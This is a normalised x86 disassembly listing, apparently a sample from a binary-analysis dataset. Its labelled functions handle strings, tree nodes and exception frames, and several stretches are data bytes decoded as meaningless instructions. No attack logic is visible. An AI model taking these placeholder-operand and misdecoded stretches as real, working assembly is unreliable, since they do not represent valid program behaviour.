mov [ ecx + 0x4 ] eax
mov ecx [ eax + 0x4 ]
mov edx [ ebp - 0x210 ]
mov [ edx + 0x4 ] ecx
mov ecx [ esi + 0x28 ]
mov edx [ ecx + 0x4 ]
cmp eax edx
jne r-xdata
mov ecx [ ebp - 0x210 ]
mov edx [ ecx ]
mov [ edx + 0x4 ] eax
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
mov ecx [ esi + 0x28 ]
mov ecx [ ecx + 0x4 ]
cmp eax ecx
jne r-xdata
mov ecx [ edx ]
mov [ ecx + 0x4 ] eax
mov ecx [ eax + 0x4 ]
mov edx [ ebp - 0x208 ]
mov [ edx + 0x4 ] ecx
mov ecx [ esi + 0x28 ]
mov edx [ ecx + 0x4 ]
cmp eax edx
jne r-xdata
mov ecx [ ebp - 0x208 ]
mov edx [ ecx + 0x8 ]
mov [ edx + 0x4 ] eax
inc [ ebp - 0x64 ]
inc [ ebp - 0x64 ]
mov eax rw-data
mov [ ebp - 0x30 ] eax
inc [ ebp - 0x64 ]
dec [ ebp - 0x64 ]
mov edx [ ebp - 0x34 ]
cmp edx 0x10
jb r-xdata
mov ecx [ ebp - 0x15c ]
mov [ ebp - 0x1cc ] ecx
mov eax [ ebp - 0x34 ]
cmp eax 0x10
jb r-xdata
lea ecx [ ebp - 0x18 ]
mov ecx [ ebp - 0x18 ]
jmp r-xdata
mov eax [ ebp - 0x184 ]
test eax eax
jbe r-xdata
mov ecx [ ebp - 0x8 ]
mov [ ebp - 0x184 ] ecx
lea edx [ ebp - 0x18 ]
mov edx [ ebp - 0x18 ]
jmp r-xdata
mov eax [ ebp - 0x164 ]
add ecx eax
mov edx [ ebp - 0x160 ]
add ecx edx
mov [ ebp - 0x16c ] ecx
mov eax [ ebp - 0x4 ]
cmp eax 0x10
jb r-xdata
mov eax [ ebp - 0xd4 ]
mov [ ebp - 0x38 ] eax
add ecx eax
mov [ ebp - 0xdc ] ecx
mov edx [ ebp - 0xdc ]
mov cl [ ebp - 0xd5 ]
mov [ edx ] cl
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + 0x8 ]
cmp eax ecx
jne r-xdata
mov ecx [ esi + 0x28 ]
mov [ ecx + 0x4 ] edx
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ecx ]
cmp eax edx
jne r-xdata
mov ecx [ esi + 0x28 ]
mov edx [ ebp - 0x210 ]
mov [ ecx + 0x4 ] edx
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov ecx [ ecx ]
cmp eax ecx
jne r-xdata
mov ecx [ esi + 0x28 ]
mov [ ecx + 0x4 ] edx
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ecx + 0x8 ]
cmp eax edx
jne r-xdata
mov ecx [ esi + 0x28 ]
mov edx [ ebp - 0x208 ]
mov [ ecx + 0x4 ] edx
jmp r-xdata
mov ecx 0xf
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x1e9 ] 0x0
mov eax [ ebp - 0x34 ]
cmp eax 0x10
jb r-xdata
mov ecx [ ebp - 0x48 ]
mov [ ebp - 0x1e4 ] ecx
mov eax [ ebp - 0x1e4 ]
mov [ ebp - 0x1e8 ] eax
mov edx [ ebp - 0x1e8 ]
push edx
call sub_4b0180
pop ecx
lea edx [ ebp - 0x48 ]
mov edx [ ebp - 0x48 ]
jmp r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
add ecx eax
mov [ ebp - 0x1c8 ] ecx
mov edx [ ebp - 0x1c8 ]
mov cl [ ebp - 0x1c1 ]
mov [ edx ] cl
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x184 ]
sub edx ecx
mov [ ebp - 0x188 ] edx
mov eax [ ebp - 0x4 ]
cmp eax 0x10
jb r-xdata
lea eax [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
jmp r-xdata
mov eax [ ebp - 0x164 ]
add edx eax
mov [ ebp - 0x170 ] edx
mov ecx [ ebp - 0x168 ]
push ecx
mov eax [ ebp - 0x16c ]
push eax
mov edx [ ebp - 0x170 ]
push edx
call sub_4c4cf8
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x160 ]
sub ecx eax
add esp 0xc
mov [ ebp - 0x174 ] ecx
mov edx [ ebp - 0x174 ]
mov [ ebp - 0x178 ] edx
mov [ ebp - 0x179 ] 0x0
mov ecx [ ebp - 0x4 ]
cmp ecx 0x10
jb r-xdata
mov ecx [ eax + 0x4 ]
mov [ ecx ] edx
mov ecx [ eax + 0x4 ]
mov [ ecx + 0x8 ] edx
jmp r-xdata
mov [ edx + 0x8 ] eax
mov [ eax + 0x4 ] edx
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ebp - 0x210 ]
mov [ ecx + 0x8 ] edx
mov ecx [ eax + 0x4 ]
mov edx [ ebp - 0x210 ]
mov [ ecx ] edx
jmp r-xdata
mov ecx [ ebp - 0x210 ]
mov [ ecx ] eax
mov edx [ ebp - 0x210 ]
mov [ eax + 0x4 ] edx
mov eax [ ebx ]
mov ecx [ eax + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ eax + 0x4 ]
mov [ ecx ] edx
jmp r-xdata
mov [ edx ] eax
mov [ eax + 0x4 ] edx
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ebp - 0x208 ]
mov [ ecx ] edx
mov ecx [ eax + 0x4 ]
mov edx [ ebp - 0x208 ]
mov [ ecx + 0x8 ] edx
jmp r-xdata
mov ecx [ ebp - 0x208 ]
mov [ ecx + 0x8 ] eax
mov edx [ ebp - 0x208 ]
mov [ eax + 0x4 ] edx
mov eax [ ebx + 0x8 ]
lea edx [ ebp - 0x48 ]
mov edx [ ebp - 0x48 ]
jmp r-xdata
lea ecx [ ebp - 0x18 ]
mov ecx [ ebp - 0x18 ]
jmp r-xdata
mov [ ebp - 0x1d0 ] edx
mov eax [ ebp - 0x4 ]
cmp eax 0x10
jb r-xdata
lea edx [ ebp - 0x18 ]
mov edx [ ebp - 0x18 ]
jmp r-xdata
mov edx [ ebp - 0x178 ]
mov [ ebp - 0x8 ] edx
add eax edx
mov [ ebp - 0x180 ] eax
mov eax [ ebp - 0x180 ]
mov cl [ ebp - 0x179 ]
mov [ eax ] cl
xor eax eax
mov [ ebp - 0x38 ] eax
add edx eax
mov [ ebp - 0x1f0 ] edx
lea eax [ ebp - 0x30 ]
mov edx [ ebp - 0x1f0 ]
mov cl [ ebp - 0x1e9 ]
mov [ edx ] cl
mov [ ebp - 0x70 ] 0xc
push eax
push r-xdata
call sub_4d1c20
add esp 0x24
lea eax [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
jmp r-xdata
mov [ ebp - 0x1d4 ] ecx
mov eax [ ebp - 0x1cc ]
push eax
mov edx [ ebp - 0x1d0 ]
push edx
mov eax [ ebp - 0x1d4 ]
push eax
call sub_4c4cb0
add esp 0xc
mov edx [ ebp - 0x15c ]
mov [ ebp - 0x1d8 ] edx
mov [ ebp - 0x1d9 ] 0x0
mov ecx [ ebp - 0x4 ]
cmp ecx 0x10
jb r-xdata
lea eax [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
jmp r-xdata
mov eax [ ebp - 0x184 ]
add edx eax
mov [ ebp - 0x18c ] edx
mov ecx [ ebp - 0x4 ]
cmp ecx 0x10
jb r-xdata
mov edx [ ebp - 0x1d8 ]
mov [ ebp - 0x8 ] edx
add eax edx
mov [ ebp - 0x1e0 ] eax
mov eax [ ebp - 0x1e0 ]
mov cl [ ebp - 0x1d9 ]
mov [ eax ] cl
lea ecx [ ebp - 0x18 ]
mov ecx [ ebp - 0x18 ]
jmp r-xdata
mov [ ebp - 0x190 ] eax
mov edx [ ebp - 0x188 ]
push edx
mov ecx [ ebp - 0x18c ]
push ecx
mov eax [ ebp - 0x190 ]
push eax
call sub_4c4cf8
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x184 ]
sub edx ecx
add esp 0xc
mov [ ebp - 0x194 ] edx
mov eax [ ebp - 0x194 ]
mov [ ebp - 0x198 ] eax
mov [ ebp - 0x199 ] 0x0
mov edx [ ebp - 0x4 ]
cmp edx 0x10
jb r-xdata
mov eax [ ebp - 0x198 ]
mov [ ebp - 0x8 ] eax
add ecx eax
mov [ ebp - 0x1a0 ] ecx
mov edx [ ebp - 0x1a0 ]
mov cl [ ebp - 0x199 ]
mov [ edx ] cl
jmp r-xdata
sub_408004
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x8 ]
mov dl [ eax + 0x15 ]
test dl dl
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov esi [ eax + 0x8 ]
mov al [ esi + 0x15 ]
test al al
jne r-xdata
mov ecx [ ebx + 0x8 ]
mov eax [ ecx + 0x4 ]
mov edx eax
add edx 0x15
mov dl [ edx ]
test dl dl
jne r-xdata
push esi
call sub_4088dc
pop ecx
mov [ ebx + 0x8 ] eax
jmp r-xdata
mov [ ebx + 0x8 ] eax
mov edx [ eax + 0x8 ]
cmp ecx edx
je r-xdata
mov [ ebx + 0x8 ] eax
sub_408050
add al 0x0
add [ eax ] al
adc [ eax ] al
or al 0x0
inc eax
mov [ eax ] es
jae r-xdata
outsb
cmp bh [ fs : edx ]
pop edi
push esp
jb r-xdata
or al 0x1
outsb
sub al 0x54
inc ebx
outsd
cmp al 0x63
outsd
outsb
jae r-xdata
pop edi
outsb
outsd
cmp al 0x73
je r-xdata
mov eax [ ebp - 0x24 ]
mov [ fs : 0x0 ] eax
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
push ecx
je r-xdata
mov [ ebp - 0x14 ] 0xc
mov ecx rw-data
inc ebp
imul esp [ ebx + 0x6f ] 0x74536564
jb r-xdata
and [ ebp + 0x6e ] dl
cmp bh [ edx ]
pop edi
push esp
insd
popad
jo r-xdata
outsd
push ebx
je r-xdata
je r-xdata
call sub_4b0180
pop ecx
outsb
imul sp [ edi + 0x46 ] 0x6c69
and [ gs : edx ] ch
imul ebp [ esi + 0x67 ] 0x6f43542c
and [ esi ] bh
sub al 0x30
and [ edx ] ch
popad
imul esi [ ebx + esi * 2 + 0x3c ] 0x63696e55
outsd
push ebx
je r-xdata
and [ gs : edx ] ch
imul ebp [ esi + 0x67 ] 0x6f43542c
outsb
imul sp [ edi + 0x46 ] 0x6c69
and [ gs : edx ] ch
sub al 0x73
je r-xdata
add esp 0xffffffdc
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x8 ] 0x3
push ebp
mov ebp esp
cmp bh [ edx ]
insb
jae r-xdata
dec [ ebp - 0x8 ]
add [ eax ] al
cmp al 0x55
outsb
imul esp [ ebx + 0x6f ] 0x74536564
jb r-xdata
outsb
sub al 0x73
je r-xdata
mov edx [ ebp + 0x8 ]
test edx edx
je r-xdata
clc
cmp bh [ edx ]
popad
insb
insb
outsd
arpl [ ecx + 0x74 ] sp
outsd
jb r-xdata
add [ eax - 0x1374aa70 ] dl
jae r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_40899c
add esp 0x8
test [ ebp + 0xc ] 0x1
cmp bh [ fs : edx ]
jo r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
sub [ ebp - 0x8 ] 0x3
push 0x0
mov [ ebp ] cl
imul esi [ edx + 0x3c ] 0x736e6f63
je r-xdata
and [ esi ] bh
cmp bh [ edx ]
pop edi
dec esi
outsd
push ebp
sub_40845a
jmp r-xdata
test esi esi
jne r-xdata
test esi esi
seta al
and eax 0x1
test al al
je r-xdata
mov [ ebp - 0xa5 ] 0x0
mov eax [ ebx + 0x24 ]
cmp eax 0x10
jb r-xdata
inc [ ebp - 0x8 ]
mov eax rw-data
mov [ edi ] eax
mov edx rw-data
inc [ ebp - 0x8 ]
mov [ edi ] edx
mov edx [ ebp - 0x24 ]
mov eax edi
mov [ fs : 0x0 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x40 ]
mov [ ebp - 0xb0 ] edx
mov ecx [ ebp - 0x2c ]
mov eax [ ecx + 0x24 ]
cmp eax 0x10
jb r-xdata
lea edx [ ebx + 0x10 ]
mov edx [ ebx + 0x10 ]
jmp r-xdata
mov ecx [ ebp - 0x2c ]
add ecx 0x10
mov edx [ ebp - 0x2c ]
mov ecx [ edx + 0x10 ]
jmp r-xdata
xor eax eax
mov [ ebx + 0x20 ] eax
add edx eax
mov [ ebp - 0xac ] edx
mov edx [ ebp - 0xac ]
mov cl [ ebp - 0xa5 ]
mov [ edx ] cl
lea edx [ ebx + 0x10 ]
mov edx [ ebx + 0x10 ]
jmp r-xdata
mov [ ebp - 0xb4 ] ecx
mov eax [ ebx + 0x24 ]
cmp eax 0x10
jb r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
mov [ ebp - 0xb8 ] edx
mov eax [ ebp - 0xb0 ]
push eax
mov ecx [ ebp - 0xb4 ]
push ecx
mov eax [ ebp - 0xb8 ]
push eax
call sub_4c4cb0
add esp 0xc
mov edx [ ebp - 0x40 ]
mov [ ebp - 0xbc ] edx
mov [ ebp - 0xbd ] 0x0
mov ecx [ ebx + 0x24 ]
cmp ecx 0x10
jb r-xdata
mov edx [ ebp - 0xbc ]
mov [ ebx + 0x20 ] edx
add eax edx
mov [ ebp - 0xc4 ] eax
mov eax [ ebp - 0xc4 ]
mov cl [ ebp - 0xbd ]
mov [ eax ] cl
sub_408628
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
push ebx
mov ebx [ ebp + 0x8 ]
call sub_4c517c
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_408650
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
push ebx
mov ebx [ ebp + 0x8 ]
call sub_4c517c
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_408678
push ebp
mov ebp esp
add esp 0xffffffd4
mov eax rw-data
push ebx
push esi
push edi
call sub_4c517c
mov edx [ ebp + 0xc ]
or edx 0xf
mov [ ebp - 0x28 ] edx
mov ecx [ ebp + 0x8 ]
add ecx 0x8
push ecx
call sub_408880
pop ecx
mov ebx eax
cmp ebx 0x1
ja r-xdata
mov eax ebx
dec eax
mov eax 0x1
jmp r-xdata
mov eax [ ebp - 0x28 ]
mov ecx 0x3
xor edx edx
div ecx
mov edx [ ebp + 0x8 ]
mov esi [ edx + 0x24 ]
mov edx esi
shr edx 0x1
cmp eax edx
jae r-xdata
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x28 ] ecx
jmp r-xdata
mov edx [ ebp - 0x28 ]
cmp eax edx
jae r-xdata
mov [ ebp - 0x14 ] 0xc
mov ebx [ ebp - 0x28 ]
inc ebx
push ebx
call sub_4bbbac
pop ecx
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x14 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x8
push eax
call sub_408880
pop ecx
mov ebx eax
cmp ebx 0x1
ja r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
jbe r-xdata
mov ecx ebx
dec ecx
mov ecx 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x24 ]
cmp eax 0x10
jb r-xdata
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x24 ]
cmp ecx 0x10
jb r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x24 ]
mov edx eax
shr eax 0x1
add edx eax
mov [ ebp - 0x28 ] edx
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x24 ]
shr edx 0x1
sub ecx edx
cmp esi ecx
ja r-xdata
mov ecx [ ebp + 0x8 ]
mov edx 0xf
xor ebx ebx
xor eax eax
mov [ ecx + 0x24 ] edx
cmp edx 0x10
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x20 ] ebx
jb r-xdata
mov edx [ ebp + 0x8 ]
mov ebx [ edx + 0x10 ]
mov esi ebx
push esi
call sub_4b0180
pop ecx
mov edx [ ebp + 0x8 ]
add edx 0x10
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x10 ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
add ecx 0x10
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x10 ]
jmp r-xdata
mov ecx [ ebp - 0x2c ]
push eax
push edx
push ecx
call sub_4c4cb0
add esp 0xc
mov ecx [ ebp + 0x8 ]
add ecx 0x10
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x10 ]
jmp r-xdata
add ebx ecx
mov edx ebx
mov [ edx ] al
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x2c ]
mov [ eax + 0x10 ] edx
xor edx edx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x28 ]
cmp ecx 0x10
mov [ eax + 0x24 ] ecx
mov ebx [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
mov [ ebx + 0x20 ] eax
jb r-xdata
add eax ecx
mov [ eax ] dl
mov eax [ ebp - 0x24 ]
mov [ fs : 0x0 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_408735
mov eax [ ebp + 0xc ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x14 ] 0x24
mov ebx [ ebp - 0x28 ]
inc ebx
push ebx
call sub_4bbbac
pop ecx
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x14 ] 0x14
jmp r-xdata
mov [ ebp - 0x14 ] 0x14
call sub_4d1d58
mov eax [ ebp + 0x10 ]
test eax eax
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x24 ]
cmp eax 0x10
jb r-xdata
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x24 ]
cmp ecx 0x10
jb r-xdata
mov ecx [ ebp + 0x8 ]
mov edx 0xf
xor ebx ebx
xor eax eax
mov [ ecx + 0x24 ] edx
cmp edx 0x10
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x20 ] ebx
jb r-xdata
mov edx [ ebp + 0x8 ]
mov ebx [ edx + 0x10 ]
mov esi ebx
push esi
call sub_4b0180
pop ecx
mov edx [ ebp + 0x8 ]
add edx 0x10
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x10 ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
add ecx 0x10
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x10 ]
jmp r-xdata
mov ecx [ ebp - 0x2c ]
push eax
push edx
push ecx
call sub_4c4cb0
add esp 0xc
mov ecx [ ebp + 0x8 ]
add ecx 0x10
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x10 ]
jmp r-xdata
add ebx ecx
mov edx ebx
mov [ edx ] al
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x2c ]
mov [ eax + 0x10 ] edx
xor edx edx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x28 ]
cmp ecx 0x10
mov [ eax + 0x24 ] ecx
mov ebx [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
mov [ ebx + 0x20 ] eax
jb r-xdata
add eax ecx
mov [ eax ] dl
mov eax [ ebp - 0x24 ]
mov [ fs : 0x0 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_408757
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x24 ]
cmp edx 0x10
jb r-xdata
mov eax [ ebp + 0x8 ]
mov edx 0xf
mov [ eax + 0x24 ] edx
xor eax eax
mov ecx [ ebp + 0x8 ]
xor ebx ebx
mov [ ecx + 0x20 ] ebx
cmp edx 0x10
jb r-xdata
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx + 0x10 ]
mov esi ebx
push esi
call sub_4b0180
pop ecx
mov ecx [ ebp + 0x8 ]
add ecx 0x10
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x10 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x24 ]
cmp eax 0x10
jb r-xdata
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x24 ]
cmp ecx 0x10
jb r-xdata
add ebx ecx
mov edx ebx
mov [ edx ] al
push 0x0
push 0x0
call sub_4d1c58
add esp 0x8
mov [ ebp - 0x14 ] 0x2c
call sub_4d1d58
mov [ ebp - 0x14 ] 0x14
call sub_4d1d58
mov eax [ ebp + 0x10 ]
test eax eax
jbe r-xdata
mov ecx [ ebp + 0x8 ]
mov edx 0xf
xor ebx ebx
xor eax eax
mov [ ecx + 0x24 ] edx
cmp edx 0x10
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x20 ] ebx
jb r-xdata
mov edx [ ebp + 0x8 ]
mov ebx [ edx + 0x10 ]
mov esi ebx
push esi
call sub_4b0180
pop ecx
mov edx [ ebp + 0x8 ]
add edx 0x10
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x10 ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
add ecx 0x10
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x10 ]
jmp r-xdata
mov ecx [ ebp - 0x2c ]
push eax
push edx
push ecx
call sub_4c4cb0
add esp 0xc
mov ecx [ ebp + 0x8 ]
add ecx 0x10
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x10 ]
jmp r-xdata
add ebx ecx
mov edx ebx
mov [ edx ] al
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x2c ]
mov [ eax + 0x10 ] edx
xor edx edx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x28 ]
cmp ecx 0x10
mov [ eax + 0x24 ] ecx
mov ebx [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
mov [ ebx + 0x20 ] eax
jb r-xdata
add eax ecx
mov [ eax ] dl
mov eax [ ebp - 0x24 ]
mov [ fs : 0x0 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_408880
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
call sub_4c517c
or eax 0xffffffff
test eax eax
ja r-xdata
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
mov esp ebp
pop ebp
retn
mov eax 0x1
sub_4088ac
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x14 ] 0xc
mov edx rw-data
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
mov eax [ ebp - 0x24 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn
sub_40899c
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
push ebx
push esi
push edi
call sub_4c517c
mov [ ebp - 0x8 ] 0x2
dec [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
test edx edx
je r-xdata
mov eax [ ebp - 0x24 ]
mov [ fs : 0x0 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x14 ] 0xc
mov ecx rw-data
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
dec [ ebp - 0x8 ]
mov ebx [ ebp + 0x8 ]
add ebx 0x8
mov eax [ ebx + 0x24 ]
cmp eax 0x10
jb r-xdata
mov edx 0xf
mov [ ebx + 0x24 ] edx
xor eax eax
cmp edx 0x10
jb r-xdata
mov esi [ ebx + 0x10 ]
mov edi esi
push edi
call sub_4b0180
pop ecx
lea edx [ ebx + 0x10 ]
mov edx [ ebx + 0x10 ]
jmp r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_4b0180
pop ecx
xor ecx ecx
mov [ ebx + 0x20 ] ecx
add edx ecx
mov [ edx ] al
dec [ ebp - 0x8 ]
push 0x0
mov eax [ ebp + 0x8 ]
push eax
call sub_4b0264
add esp 0x8
test [ ebp + 0xc ] 0x1
je r-xdata
sub_408b88
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebx + 0x24 ]
cmp eax 0x10
jb r-xdata
mov edx 0xf
mov [ ebx + 0x24 ] edx
xor eax eax
cmp edx 0x10
jb r-xdata
mov esi [ ebx + 0x10 ]
mov edi esi
push edi
call sub_4b0180
pop ecx
lea edx [ ebx + 0x10 ]
mov edx [ ebx + 0x10 ]
jmp r-xdata
push ebx
call sub_4b0180
pop ecx
xor ecx ecx
mov [ ebx + 0x20 ] ecx
add edx ecx
mov [ edx ] al
test [ ebp + 0xc ] 0x1
je r-xdata
sub_408d47
inc [ ebx ]
add [ eax ] al
add [ eax ] al
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
add al 0x0
add [ eax ] al
hlt
sub_409058
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
push ebx
push esi
mov ebx [ ebp + 0x8 ]
call sub_4c517c
test ebx ebx
je r-xdata
mov ecx [ ebp - 0x24 ]
mov [ fs : 0x0 ] ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
dec [ ebp - 0x8 ]
lea esi [ ebx + 0xc ]
dec [ ebp - 0x8 ]
mov edx 0x2
mov eax esi
call sub_4d318c
test [ ebp + 0xc ] 0x1
je r-xdata
push ebx
call sub_4b0180
pop ecx
sub_40912b
inc [ eax + eax ]
add [ eax ] al
xor al 0x0
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x74 ] dh
cmp bh [ fs : edx ]
pop edi
push ebx
je r-xdata
add ah dl
add ah ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x74 ] dh
cmp bh [ fs : edx ]
pop edi
push esp
jb r-xdata
imul ebp [ esi + 0x67 ] 0x7361625f
add [ gs : eax ] al
add ah ah
mov es [ eax ]
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
push ebx
mov ebx [ ebp + 0x8 ]
call sub_4c517c
test ebx ebx
je r-xdata
outsd
arpl [ ecx + 0x74 ] sp
outsd
jb r-xdata
pop edi
outsb
outsd
cmp al 0x73
je r-xdata
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
pop ebx
mov esp ebp
pop ebp
retn
dec [ ebp - 0x8 ]
mov edx 0x2
mov eax ebx
call sub_4d318c
test [ ebp + 0xc ] 0x1
je r-xdata
add [ eax ] al
add [ edx + edx * 4 + 0x40 ] dl
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
add [ eax ] al
add eax [ eax ]
and [ eax ] al
jae r-xdata
je r-xdata
cmp bh [ edx ]
pop edi
push esp
insd
popad
jo r-xdata
push ebx
call sub_4b0180
pop ecx
cmp bh [ edx ]
cmp bh [ fs : edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jae r-xdata
jo r-xdata
cmp bh [ edx ]
cmp dh [ eax + 0x61 ]
je r-xdata
cmp dh [ eax + 0x61 ]
je r-xdata
pop edi
push esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x74 ] dh
imul esi [ edx + 0x3c ] 0x736e6f63
je r-xdata
push ebx
jns r-xdata
cmp bh [ fs : edx ]
and [ gs : edx ] ch
and [ esi ] bh
sub al 0x30
and [ esi ] bh
push ebx
jns r-xdata
outsb
imul esp [ ebx + 0x6f ] 0x74536564
jb r-xdata
popad
imul esi [ ebx + esi * 2 + 0x3c ] 0x74737953
insd
cmp bh [ edx ]
push ebp
outsb
imul esp [ ebx + 0x6f ] 0x74536564
jb r-xdata
and [ gs : edx ] ch
and [ esi ] bh
sub al 0x30
add ah ah
outsb
imul esp [ ebx + 0x6f ] 0x74536564
jb r-xdata
popad
imul esi [ ebx + esi * 2 + 0x3c ] 0x74737953
insd
dec esi
add [ edx + 0x10 ] ch
je r-xdata
jns r-xdata
je r-xdata
imul esp [ ebx + 0x6f ] 0x74536564
jb r-xdata
cmp dl [ ebp + 0x6e ]
outsb
sub al 0x54
inc ebx
outsd
outsb
imul sp [ edi + 0x46 ] 0x6c69
outsb
sub al 0x54
inc ebx
outsd
outsb
imul sp [ edi + 0x46 ] 0x6c69
and [ gs : edx ] ch
sub al 0x73
je r-xdata
mov edx rw-data
mov eax [ eax ]
call sub_4826f8
mov edx [ rw-data ]
mov eax [ edx ]
call sub_4825dc
mov cl [ ebp ]
outsb
sub al 0x54
inc ebx
outsd
outsb
sub al 0x54
inc ebx
outsd
outsb
imul sp [ edi + 0x46 ] 0x6c69
and [ gs : edx ] ch
sub al 0x73
je r-xdata
mov ecx [ rw-data ]
mov esi [ ecx + 0x1c ]
test esi esi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_47f5f8
add eax 0xffffffe0
cmp esi eax
jge r-xdata
test al al
jne r-xdata
insd
outsb
imul sp [ edi + 0x46 ] 0x6c69
imul ebp [ esi + 0x67 ] 0x6f43542c
je r-xdata
insd
popad
jo r-xdata
insd
cmp bh [ edx ]
push ebp
add [ eax ] al
add [ eax ] al
xchg esp eax
